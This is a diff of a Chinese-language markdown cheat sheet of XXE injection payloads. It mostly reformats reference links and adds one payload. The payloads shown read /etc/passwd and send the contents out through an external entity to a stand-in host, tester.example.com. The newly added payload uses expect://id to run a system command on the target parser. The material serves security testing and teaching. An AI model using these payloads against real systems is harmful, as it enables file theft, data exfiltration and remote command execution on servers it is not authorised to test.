@@ -9,14 +9,14 @@
 ---
 
 ## Refence
-- [XXE漏洞的学习与利用总结](https://www.cnblogs.com/r00tuser/p/7255939.html)
-- [XXE漏洞利用技巧：从XML到远程代码执行](https://www.freebuf.com/articles/web/177979.html)
+- [XXE 漏洞的学习与利用总结](https://www.cnblogs.com/r00tuser/p/7255939.html)
+- [XXE 漏洞利用技巧：从 XML 到远程代码执行](https://www.freebuf.com/articles/web/177979.html)
 - [XXE: XML eXternal Entity Injection vulnerabilities](https://www.gracefulsecurity.com/xml-external-entity-injection-xxe-vulnerabilities/)
-- [浅谈XXE攻击](https://www.freebuf.com/articles/web/126788.html)
+- [浅谈 XXE 攻击](https://www.freebuf.com/articles/web/126788.html)
 
 ---
 
-## 基础 Payload
+## 一些 Payload
 
 ```
 <!--?xml version="1.0" ?-->
@@ -69,4 +69,11 @@
 The contents of xxe_file should be:
 <!ENTITY % payload SYSTEM "file:///etc/passwd">
 <!ENTITY % param1 "<!ENTITY external SYSTEM 'http://tester.example.com/log_xxe?data=%payload;'>">
+```
+
+```
+<!--?xml version="1.0" ?-->
+<!DOCTYPE name [
+<!ENTITY lol SYSTEM "expect://id">
+<name>&lol;</name>
 ```
